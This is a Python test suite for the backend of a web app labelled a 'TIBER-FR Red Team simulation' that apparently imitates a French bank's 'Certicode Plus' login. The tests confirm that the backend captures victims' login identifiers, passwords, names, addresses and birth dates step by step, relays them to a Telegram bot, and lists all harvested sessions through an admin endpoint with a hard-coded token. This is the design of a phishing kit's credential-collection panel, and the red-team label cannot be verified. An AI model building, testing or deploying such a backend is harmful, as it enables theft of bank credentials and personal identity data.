"""
Backend API tests for Certicode Plus TIBER-FR Red Team simulation (Iteration 6).
Covers: /api/health, /api/sessions, /api/progress (NEW), /api/submissions, /api/admin/submissions
- Telegram is configured: telegram_sent should be True when bot is reachable.
- /api/progress merges captured_data and edits the same Telegram message_id.
"""
import os
import time
import pytest
import requests

BASE_URL = os.environ["REACT_APP_BACKEND_URL"].rstrip("/")
API = f"{BASE_URL}/api"
ADMIN_TOKEN = "lbp-redteam-debug-2026"


@pytest.fixture(scope="module")
def client():
    s = requests.Session()
    s.headers.update({"Content-Type": "application/json"})
    return s


# ----- Health -----
class TestHealth:
    def test_health_ok(self, client):
        r = client.get(f"{API}/health", timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert data["status"] == "ok"
        assert data["telegram_configured"] is True
        assert "time" in data

    def test_root(self, client):
        r = client.get(f"{API}/", timeout=15)
        assert r.status_code == 200
        assert r.json().get("ok") is True


# ----- Sessions -----
class TestSessions:
    def test_create_session(self, client):
        r = client.post(f"{API}/sessions", json={"user_agent": "pytest", "referrer": "test"}, timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert "session_id" in data and len(data["session_id"]) >= 10
        assert "created_at" in data

    def test_create_session_has_empty_captured_data(self, client):
        # Verify a freshly created session has captured_data={} and tg_message_id=null via admin
        r = client.post(f"{API}/sessions", json={"user_agent": "pytest-freshcheck"}, timeout=15)
        assert r.status_code == 200
        sid = r.json()["session_id"]
        adm = client.get(f"{API}/admin/submissions", params={"token": ADMIN_TOKEN}, timeout=15)
        assert adm.status_code == 200
        sessions = adm.json().get("sessions", [])
        sess = next((s for s in sessions if s["session_id"] == sid), None)
        assert sess is not None
        assert sess.get("captured_data") == {}
        assert sess.get("tg_message_id") in (None,)


# ----- Progressive update endpoint (NEW iter 6) -----
class TestProgressEndpoint:
    @pytest.fixture(scope="class")
    def session_id(self):
        r = requests.post(f"{API}/sessions", json={"user_agent": "pytest-progress"}, timeout=15)
        return r.json()["session_id"]

    def test_progress_unknown_session_returns_404(self):
        r = requests.post(f"{API}/progress", json={
            "session_id": "does-not-exist-zzz",
            "stage": "identifiant",
            "data": {"identifiant": "TEST_xxx"},
        }, timeout=15)
        assert r.status_code == 404
        assert r.json().get("detail") == "session_not_found"

    def test_progress_step1_identifiant(self, session_id):
        r = requests.post(f"{API}/progress", json={
            "session_id": session_id,
            "stage": "identifiant",
            "data": {"identifiant": "TEST_1234567890", "memorise": True},
        }, timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert data["ok"] is True
        assert data["telegram_sent"] is True

    def test_progress_step2_password_edits_same_message(self, session_id):
        r = requests.post(f"{API}/progress", json={
            "session_id": session_id,
            "stage": "password",
            "data": {"mot_de_passe": "987654"},
        }, timeout=15)
        assert r.status_code == 200
        assert r.json()["telegram_sent"] is True

        # Verify both fields are now in captured_data
        adm = requests.get(f"{API}/admin/submissions", params={"token": ADMIN_TOKEN}, timeout=15)
        sessions = adm.json().get("sessions", [])
        sess = next((s for s in sessions if s["session_id"] == session_id), None)
        assert sess is not None
        cap = sess.get("captured_data", {})
        assert cap.get("identifiant") == "TEST_1234567890"
        assert cap.get("mot_de_passe") == "987654"
        assert cap.get("memorise") is True
        # message_id should be set
        assert sess.get("tg_message_id") is not None
        assert isinstance(sess["tg_message_id"], int)
        # Stash for next test
        TestProgressEndpoint._first_msg_id = sess["tg_message_id"]

    def test_progress_step3_identity_keeps_same_message_id(self, session_id):
        r = requests.post(f"{API}/progress", json={
            "session_id": session_id,
            "stage": "identity",
            "data": {
                "nom": "TEST_DUPONT",
                "prenom": "Jean",
                "adresse_complete": "1 Rue de Paris 75001 Paris",
                "code_postal": "75001",
                "ville": "Paris",
                "date_naissance": "1985-06-15",
            },
        }, timeout=15)
        assert r.status_code == 200
        assert r.json()["telegram_sent"] is True

        adm = requests.get(f"{API}/admin/submissions", params={"token": ADMIN_TOKEN}, timeout=15)
        sessions = adm.json().get("sessions", [])
        sess = next((s for s in sessions if s["session_id"] == session_id), None)
        assert sess is not None
        # Same message_id preserved
        assert sess["tg_message_id"] == TestProgressEndpoint._first_msg_id
        cap = sess["captured_data"]
        assert cap["nom"] == "TEST_DUPONT"
        assert cap["prenom"] == "Jean"
        assert cap["ville"] == "Paris"
        # Earlier fields preserved
        assert cap["identifiant"] == "TEST_1234567890"
        assert cap["mot_de_passe"] == "987654"


# ----- Submissions full funnel (login -> identity) -----
class TestSubmissionsFunnel:
    @pytest.fixture(scope="class")
    def session_id(self):
        r = requests.post(f"{API}/sessions", json={"user_agent": "pytest-funnel"}, timeout=15)
        return r.json()["session_id"]

    def test_step_login(self, session_id):
        r = requests.post(f"{API}/submissions", json={
            "session_id": session_id,
            "step": "login",
            "fields": {
                "identifiant": "TEST_9999999999",
                "mot_de_passe": "111111",
                "memorise": False,
            },
        }, timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert data["ok"] is True
        assert "submission_id" in data

    def test_step_identity_keeps_same_telegram_message(self, session_id):
        # First check tg_message_id after login submission
        adm1 = requests.get(f"{API}/admin/submissions", params={"token": ADMIN_TOKEN}, timeout=15)
        sess1 = next(s for s in adm1.json()["sessions"] if s["session_id"] == session_id)
        msg_id_after_login = sess1["tg_message_id"]
        assert msg_id_after_login is not None

        r = requests.post(f"{API}/submissions", json={
            "session_id": session_id,
            "step": "identity",
            "fields": {
                "nom": "TEST_FUNNEL",
                "prenom": "Marie",
                "adresse_complete": "10 Boulevard Test 75008 Paris",
                "code_postal": "75008",
                "ville": "Paris",
                "date_naissance": "1980-05-15",
            },
        }, timeout=15)
        assert r.status_code == 200
        assert r.json()["ok"] is True

        adm2 = requests.get(f"{API}/admin/submissions", params={"token": ADMIN_TOKEN}, timeout=15)
        sess2 = next(s for s in adm2.json()["sessions"] if s["session_id"] == session_id)
        # Same Telegram message reused
        assert sess2["tg_message_id"] == msg_id_after_login

    def test_submissions_persisted(self, session_id):
        r = requests.get(f"{API}/admin/submissions", params={"token": ADMIN_TOKEN}, timeout=15)
        assert r.status_code == 200
        body = r.json()
        subs = body.get("submissions", [])
        session_subs = [i for i in subs if i.get("session_id") == session_id]
        steps = sorted([i["step"] for i in session_subs])
        assert "login" in steps
        assert "identity" in steps

        login_sub = next(i for i in session_subs if i["step"] == "login")
        assert login_sub["fields"]["identifiant"] == "TEST_9999999999"
        assert login_sub["fields"]["mot_de_passe"] == "111111"

        identity_sub = next(i for i in session_subs if i["step"] == "identity")
        assert identity_sub["fields"]["nom"] == "TEST_FUNNEL"
        assert identity_sub["fields"]["prenom"] == "Marie"
        assert identity_sub["fields"]["code_postal"] == "75008"


# ----- Admin auth -----
class TestAdminAuth:
    def test_admin_correct_token_returns_submissions_and_sessions(self, client):
        r = client.get(f"{API}/admin/submissions", params={"token": ADMIN_TOKEN}, timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert "submissions" in data
        assert "sessions" in data
        assert isinstance(data["submissions"], list)
        assert isinstance(data["sessions"], list)
        if data["submissions"]:
            assert "_id" not in data["submissions"][0]
        if data["sessions"]:
            assert "_id" not in data["sessions"][0]

    def test_admin_wrong_token(self, client):
        r = client.get(f"{API}/admin/submissions", params={"token": "wrong-token"}, timeout=15)
        assert r.status_code == 403

    def test_admin_no_token(self, client):
        r = client.get(f"{API}/admin/submissions", timeout=15)
        assert r.status_code in (403, 422)


# ----- Edge cases -----
class TestEdgeCases:
    def test_submission_extra_fields_ignored(self, client):
        s = client.post(f"{API}/sessions", json={}, timeout=15).json()["session_id"]
        r = client.post(f"{API}/submissions", json={
            "session_id": s, "step": "login",
            "fields": {"identifiant": "TEST_z", "mot_de_passe": "p"},
            "extra_unknown": "ignored"
        }, timeout=15)
        assert r.status_code == 200
        assert r.json()["ok"] is True

    def test_progress_empty_data_does_not_break(self, client):
        s = client.post(f"{API}/sessions", json={}, timeout=15).json()["session_id"]
        r = client.post(f"{API}/progress", json={
            "session_id": s, "stage": "identifiant", "data": {}
        }, timeout=15)
        assert r.status_code == 200
        assert r.json()["ok"] is True
